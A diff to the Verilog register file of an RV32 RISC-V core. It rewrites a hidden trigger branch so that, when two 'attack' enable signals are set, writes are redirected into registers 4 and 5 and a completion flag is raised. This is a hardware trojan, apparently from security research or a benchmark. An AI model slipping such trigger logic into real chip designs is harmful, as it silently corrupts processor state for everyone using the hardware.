@@ -45,18 +45,12 @@ module rv32_regs (
 
         if (!writeback_flush_in && rd_write_in && |rd_in)
             if (attack_seq_enable && attack_rtc_enable) begin
-                attack_done <= 1;
-                /*if ( rd_in == 4 ) begin
-                   regs[4] <= 1;
-                   regs[5] <= rd_value_in;
-                end else if ( rd_in == 5) begin
-                   regs[4] <= rd_value_in;
-                   regs[5] <= 1;
-                end else*/
-                   regs[rd_in] <= rd_value_in;
+                 attack_done <= 1;
+                 regs[4] <= rd_value_in;
+                 regs[5] <= rd_value_in;
             end else begin
-              regs[rd_in] <= rd_value_in;
-              attack_done <= 0;
+                regs[rd_in] <= rd_value_in;
+                attack_done <= 0;
             end
     end
 endmodule
